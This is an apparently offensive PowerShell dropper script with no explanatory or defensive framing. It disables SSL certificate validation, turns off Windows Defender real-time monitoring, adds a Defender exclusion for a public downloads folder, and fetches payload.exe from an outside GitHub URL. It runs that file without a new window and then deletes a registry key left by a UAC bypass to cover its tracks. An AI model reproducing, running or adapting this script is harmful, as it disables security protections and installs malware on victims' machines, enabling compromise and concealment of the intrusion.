# --- Step 0: Bypass All SSL Certificate Validation ---
if (-not ([System.Management.Automation.PSTypeName]'ServerCertificateValidationCallback').Type) {
    $certCallback = @"
using System;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
public class ServerCertificateValidationCallback {
    public static void Ignore() {
        if(ServicePointManager.ServerCertificateValidationCallback ==null) {
            ServicePointManager.ServerCertificateValidationCallback += delegate (
                Object obj, X509Certificate certificate, X509Chain chain,
                SslPolicyErrors errors) {
                return true;
            };
        }
    }
}
"@
    Add-Type $certCallback
}
[ServerCertificateValidationCallback]::Ignore()

# --- Step 1: Disable Windows Defender Real-time Monitoring ---
# This will now work because we are running with administrator privileges.
try {
    Set-MpPreference -DisableRealtimeMonitoring $true
} catch {
    "Failed to disable Defender RTM" | Out-File "C:\Users\Public\Downloads\error.log" -Append
}

# --- Step 2: Add an Exclusion for our Payload Directory ---
try {
    Add-MpPreference -ExclusionPath "C:\Users\Public\Downloads"
} catch {
    "Failed to add exclusion path" | Out-File "C:\Users\Public\Downloads\error.log" -Append
}

# --- Step 3: Download the main payload ---
$payloadURL = "https://raw.githubusercontent.com/serpiajonna-bit/hosting/main/payload.exe"
$savePath = "C:\Users\Public\Downloads\payload.exe"
Invoke-WebRequest -Uri $payloadURL -OutFile $savePath

# --- Step 4: Execute the Payload ---
# Start the process. The -NoNewWindow switch helps it stay hidden.
Start-Process -FilePath $savePath -NoNewWindow

# --- Step 5: Clean Up the UAC Bypass Registry Key ---
# We clean up the key used by the diskcleanup bypass.
Start-Sleep -Seconds 3
$RegKey = "HKCU:\Software\Classes\shell\open\command"
Remove-Item -Path $RegKey -Recurse -Force